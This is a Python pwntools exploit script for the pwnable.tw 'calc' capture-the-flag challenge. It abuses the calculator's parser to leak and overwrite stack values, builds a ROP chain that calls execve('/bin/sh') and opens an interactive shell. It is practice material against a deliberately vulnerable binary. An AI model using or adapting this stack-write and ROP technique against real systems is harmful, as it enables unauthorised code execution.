from pwn import *
import sys

from six import b


def main():
    if(len(sys.argv)<2):
        print("You need to provide the target binary (local or remote)")
    if(sys.argv[1] == "remote"):
        p = remote("chall.pwnable.tw", 10100)
    else:
        p = process("./calc")

    GetShell(p)
    

def ReadByOffset(offset, p):
    offset = 361 +offset 
    leak_payload =b"+" + str(offset).encode()  
    print(leak_payload)
    p.sendline(leak_payload)
    stored_val = p.recvline()[:-1]
    return int(stored_val)



def WriteByOffset(offset,target_value, p):
    # incrementingly make changes to the stack frame of the calc function (we need to use either that one or main, so that changes aren't overwritten by multiple function calls)

    offset = 361 +offset # I will be using the return address in calc as base. +361 is the offset where calc's return address is stored
    leak_payload =b"+" + str(offset).encode()  
    print(leak_payload)
    p.sendline(leak_payload)
    current_value = p.recvline()[:-1]
    print("leaked value: ",current_value)
    if(target_value!=current_value):
        res = target_value-int(current_value)
        operation = "+"
        if(res <0):
            operation = "-"
            res *=-1

        payload = "+"+ str(offset)+ operation+ str(res)
        print("sending: ",payload)
        p.sendline(payload)
        print("value changed to: ",p.recvline())

    return; # if they are equal, there's no need to change anything.




def GetShell(p):
    p.recvline()
    # gdb.attach(p, gdbscript="""
    # b *0x80bc546
    # c
    # """)
    
    ebp = ReadByOffset(-1,p) # this is offset +360, or the place we do our first write to.
    print("main's ebp is : " ,ebp)
    base_addr =  ebp-28
    print("calc's ret addr is:" ,base_addr)

    bin_sh_ptr = base_addr +(7*4)
    argv_ptr = base_addr +(9*4)
    envp_ptr = base_addr +(10*4)


    bin_sh_1=0x6e69622f # memory in buffers is read from the lower address to the higher address.
    bin_sh_2=0x0068732f 

    pop_eax = 0x80bc546
    pop_ecx_edx_ebx= 0x80701d0

    WriteByOffset(0,pop_eax,p )
    WriteByOffset(1,0x0B,p )
    WriteByOffset(2,pop_ecx_edx_ebx,p )
    WriteByOffset(3,envp_ptr,p ) # *(envp_ptr)=0
    WriteByOffset(4,argv_ptr,p ) # **(argv_ptr) = /bin/sh
    WriteByOffset(5,bin_sh_ptr,p ) # *(bin_sh_ptr) = /bin/sh

    WriteByOffset(6,0x8070880,p)


    WriteByOffset(7,bin_sh_1,p )
    WriteByOffset(8,bin_sh_2,p )

    WriteByOffset(9,bin_sh_ptr,p )
    WriteByOffset(10,0,p )

    p.sendline("pwned_by_gio :)")
    p.interactive()
    return;
if(__name__=="__main__"):
    main()


